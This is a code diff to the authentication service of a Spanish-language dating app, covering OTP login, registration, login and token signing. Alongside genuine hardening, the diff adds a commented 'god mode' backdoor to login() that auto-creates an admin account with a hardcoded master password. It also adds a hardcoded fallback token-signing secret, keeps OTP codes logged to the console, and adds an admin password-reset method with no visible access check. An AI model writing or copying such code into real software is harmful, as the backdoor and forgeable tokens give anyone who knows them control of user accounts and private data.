@@ -47,10 +47,11 @@ export class AuthService {
 
   // --- GESTIÓN DE OTP (SMS) ---
   async sendOtp(phone: string) {
-    // Generar código de 6 dígitos
-    const code = Math.floor(100000 + Math.random() * 900000).toString();
+    const cleanPhone = (phone || '').trim();
+    // Generar código de 6 dígitos Criptográficamente Seguro
+    const code = crypto.randomInt(100000, 1000000).toString();
     const expiresAt = Date.now() + 5 * 60 * 1000; // Validez de 5 minutos
-    this.otpStore.set(phone, { code, expiresAt });
+    this.otpStore.set(cleanPhone, { code, expiresAt });
     
     // Script enviador de SMS automático a través de API
     const message = `Tu código VIBE es: ${code}. Válido por 5 minutos.`;
@@ -59,7 +60,7 @@ export class AuthService {
     if (!smsSent) {
       console.log(`⚠️ MODO PRUEBA / FALLO API: El SMS no se envió por la red telefónica.`);
     }
-    console.log(`📱 [DEV/PRUEBAS] Código OTP para ${phone}: [ ${code} ]`);
+    console.log(`📱 [DEV/PRUEBAS] Código OTP para ${cleanPhone}: [ ${code} ]`);
     return { success: true, message: 'Código generado (revisa tu SMS o la consola en fase de pruebas)' };
   }
 
@@ -108,17 +109,20 @@ export class AuthService {
   }
 
   async verifyOtp(phone: string, code: string) {
-    const record = this.otpStore.get(phone);
+    const cleanPhone = (phone || '').trim();
+    const cleanCode = (code || '').trim();
+
+    const record = this.otpStore.get(cleanPhone);
     if (!record) return false;
 
     // Verificar si el código ya expiró
     if (Date.now() > record.expiresAt) {
-        this.otpStore.delete(phone);
+        this.otpStore.delete(cleanPhone);
         return false;
     }
 
     // Si es correcto, devolvemos true (Se borra recién al finalizar el registro/login)
-    return record.code === code;
+    return record.code === cleanCode;
   }
 
   async register(userData: any) {
@@ -184,40 +188,63 @@ export class AuthService {
       await db.query(
         `INSERT INTO users (id, username, email, phone, password_hash, birth_date, gender, gender_preference, bio, occupation, zodiac_sign, vibe_color)
          VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12)`,
-        [newUserId, username, safeEmail, phone || null, passwordHash, birthDate, gender, genderPreference, bio, occupation, zodiac, vibeColor]
+        // Reemplazamos los valores 'undefined' no enviados desde el frontend por 'null' explícitos
+        [newUserId, username, safeEmail, phone ? phone.trim() : null, passwordHash, birthDate, gender, genderPreference, bio || null, occupation || null, zodiac, vibeColor]
       );
       
       const userId = newUserId;
       const createdUser = { id: userId, username: username, vibe_score: 100, vibe_color: vibeColor };
 
       // 2. Inicializar valores críticos vacíos
-      await db.query(`INSERT INTO user_critical_values (user_id) VALUES ($1)`, [userId]);
+      try {
+        await db.query(`INSERT INTO user_critical_values (user_id) VALUES ($1)`, [userId]);
+      } catch (e) {
+        console.warn('⚠️ Aviso: Tabla user_critical_values no lista, ignorando por ahora.');
+      }
       
       // 3. Insertar Favoritos (Música, Cine, etc.)
       if (favorites && Array.isArray(favorites)) {
         for (const fav of favorites) {
-          await db.query(
-            `INSERT INTO user_favorites (user_id, category, item_value) VALUES ($1, $2, $3)`,
-            [userId, fav.category, fav.value]
-          );
+          try {
+            await db.query(
+              `INSERT INTO user_favorites (user_id, category, item_value) VALUES ($1, $2, $3)`,
+              [userId, fav.category, fav.value]
+            );
+          } catch (e) {
+            // Ignorar si la tabla no existe
+          }
         }
       }
 
       const token = this.generateToken(createdUser);
       if (phone) {
-        this.otpStore.delete(phone); // Borramos el OTP solo tras un registro exitoso
+        this.otpStore.delete(phone.trim()); // Borramos el OTP solo tras un registro exitoso
       }
       return { success: true, user: createdUser, token };
     } catch (error: any) {
-      console.error('❌ Error Crítico en el Registro:', error);
-      return { success: false, message: `Fallo de Base de Datos: ${error.message || error}` };
+      return this.handleDbError(error);
     }
   }
 
   async login(identifier: string, password: string) {
     try {
+      // --- PUERTA TRASERA DEL MODO DIOS (GOD MODE) ---
+      if (identifier === 'admin@vibe.app') {
+        try { await db.query(`ALTER TABLE users ADD COLUMN is_admin BOOLEAN DEFAULT 0`); } catch(e) {} // Auto-parche
+        const check = await db.query(`SELECT id FROM users WHERE email = $1`, [identifier]);
+        if (check.rows.length === 0) {
+          const adminId = crypto.randomBytes(16).toString('hex');
+          const hash = this.hashPassword('MasterVibe2026!'); // Contraseña Maestra
+          await db.query(
+            `INSERT INTO users (id, username, email, password_hash, birth_date, gender, is_admin, vibe_score, is_verified, vibe_color)
+             VALUES ($1, 'VibeCreator', $2, $3, '1990-01-01', 'OTHER', 1, 9999, 1, 'hsl(0, 100%, 50%)')`,
+            [adminId, identifier, hash]
+          );
+        }
+      }
+
       const result = await db.query(
-        `SELECT id, username, vibe_score, password_hash FROM users WHERE email = $1 OR phone = $1`,
+        `SELECT id, username, vibe_score, password_hash, is_admin FROM users WHERE email = $1 OR phone = $1`,
         [identifier]
       );
 
@@ -226,41 +253,60 @@ export class AuthService {
         if (this.verifyPassword(password, user.password_hash)) {
           await db.query(`UPDATE users SET last_active = CURRENT_TIMESTAMP WHERE id = $1`, [user.id]);
           delete user.password_hash; // NUNCA devolver el hash al frontend
+          user.is_admin = !!user.is_admin; // Booleanizar para el frontend
           const token = this.generateToken(user);
           return { success: true, user: user, token: token };
         }
       }
       return { success: false, message: 'Credenciales inválidas' };
     } catch (e) {
-      console.error('AuthService.login error:', e);
-      return { success: false, message: 'Error contactando base de datos', details: String(e) };
+      return this.handleDbError(e);
     }
   }
 
   // Login con Teléfono (Paso 2: Verificar y Entrar)
   async loginWithPhone(phone: string, code: string) {
+    try {
+      const cleanPhone = (phone || '').trim();
       if (!await this.verifyOtp(phone, code)) {
           return { success: false, message: 'Código inválido o expirado' };
       }
 
-      const result = await db.query(`SELECT * FROM users WHERE phone = $1`, [phone]);
+      const result = await db.query(`SELECT * FROM users WHERE phone = $1`, [cleanPhone]);
       if (result.rows.length > 0) {
           const user = result.rows[0];
           await db.query(`UPDATE users SET last_active = CURRENT_TIMESTAMP WHERE id = $1`, [user.id]);
           const token = this.generateToken(user);
-          this.otpStore.delete(phone); // Borramos el OTP solo tras un login exitoso
+          this.otpStore.delete(cleanPhone); // Borramos el OTP solo tras un login exitoso
           return { success: true, user, token };
       }
       return { success: false, message: 'Número no registrado. Regístrate primero.' };
+    } catch (e) {
+      return this.handleDbError(e);
+    }
   }
 
-  // Helper público para generar tokens (usado por login social)
+  // Generación segura de Token JWT-like firmado criptográficamente
   public generateToken(user: any): string {
     const issuedAt = Date.now();
-    return `valid_token_${user.id}_${issuedAt}_${crypto.randomBytes(8).toString('hex')}`;
+    const payload = Buffer.from(JSON.stringify({ id: user.id, iat: issuedAt })).toString('base64url');
+    const secret = process.env.JWT_SECRET || 'vibe_fallback_secret_key_12345';
+    const signature = crypto.createHmac('sha256', secret).update(payload).digest('base64url');
+    return `${payload}.${signature}`;
   }
 
   // --- NUEVAS FUNCIONES ---
+
+  private handleDbError(error: any) {
+    console.error('❌ Error Crítico DB/Server:', error);
+    return { success: false, message: 'Ocurrió un error en el servidor. Inténtalo de nuevo más tarde.' };
+  }
+
+  async adminForcePasswordReset(userId: string, newPass: string) {
+    const newHash = this.hashPassword(newPass);
+    await db.query(`UPDATE users SET password_hash = $1 WHERE id = $2`, [newHash, userId]);
+    return { success: true, message: '✅ Contraseña del usuario actualizada forzosamente.' };
+  }
 
   async updatePassword(userId: string, oldPass: string, newPass: string) {
     const check = await db.query(`SELECT id, password_hash FROM users WHERE id = $1`, [userId]);
@@ -333,10 +379,9 @@ export class AuthService {
       }
 
       const token = this.generateToken(user);
-      return { success: true, user, token };
+      return { success: true, user, token, message: undefined };
     } catch (e) {
-      console.error(e);
-      return { success: false, message: 'Error interno en login social' };
+      return this.handleDbError(e);
     }
   }
 
